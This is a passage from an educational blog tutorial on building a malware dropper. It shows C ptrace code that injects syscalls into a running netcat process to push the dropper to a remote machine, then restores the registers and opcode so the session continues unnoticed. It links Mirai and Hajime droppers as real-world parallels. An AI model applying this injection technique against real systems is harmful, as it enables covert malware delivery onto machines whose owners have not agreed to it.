      
     if ((ptrace (PTRACE_SETREGS, _pid, 0, &regs)) < 0)
	    perror (""ptrace_set_regs:"");
	
     if ((ptrace (PTRACE_SINGLESTEP, _pid, 0,0)) < 0) perror (""Run syscallL"");
     wait (&status);
	  
     if ((ptrace (PTRACE_SINGLESTEP, _pid, 0,0)) < 0) perror (""Run syscallL"");
     wait (&status);
```

So, we set our registers. See it as a bunch of `mov`s, but we can just set all of them at once using `PTRACE_SETREGS`. Then we use the `PTRACE_SINGLESTEP` to run our instruction and `wait` to get control back from the process.

Here I have to say that I haven't figured our yet why I need to call `PTRACE_SINGLESTEP` twice. If anybody know, let us all know in the comments.

# Cleaning up

Now the buffer has been sent to the remote machine. We just need to send the `echo` command shown above to _Drop the Dropper_ in the remote machine.

Finally, we just want to clean up, so our shell session keeps going normally. If we just stop here, `nc` will likely crash. The clean up code is also straightforward:

```
  if ((ptrace (PTRACE_POKETEXT, _pid, regs_cpy.rip, opcode)) < 0) 
       perror (""Restore opcode:"");

  if ((ptrace (PTRACE_SETREGS, _pid, 0, &regs_cpy)) < 0) 
       perror (""ptrace_set_regs:"");
  
  if ((ptrace (PTRACE_DETACH, _pid, NULL, NULL)) < 0) 
       perror (""ptrace_deattach:"");
  wait (&status);
```

The first thing we do is to restore the original opcode we override with our own `syscall` opcodes. Note that we are now using the copy of the registers we made at the beginning, so everything will go to the right place despite of how much we could have messed around while tracing the process.

Then we restore the registers and everything should be fine to get back to the point it was before we attached to the process. Now we just need to `detach` from the process and it will just keep running normally.

# Conclusions

In this part we have worked on the concept we already know and applied it to the case of building a dropper. We have lightly touched the field of network programming and we ended up introducing the basics about writing debuggers.

Most of what we have seen in this part is pretty similar to stuff you may find in the real world. Take a look to [this post](https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966) specially to the paper linked at the end about Hajime.

Did you made the dropper smaller?. Have you used other ideas to shrinking it?. Let us know. Any comment, question and feedback is welcomed! :)

* PREVIOUS: [Programming for Wannabes. Part IV. The Stack](part-04.md)
* NEXT : ??

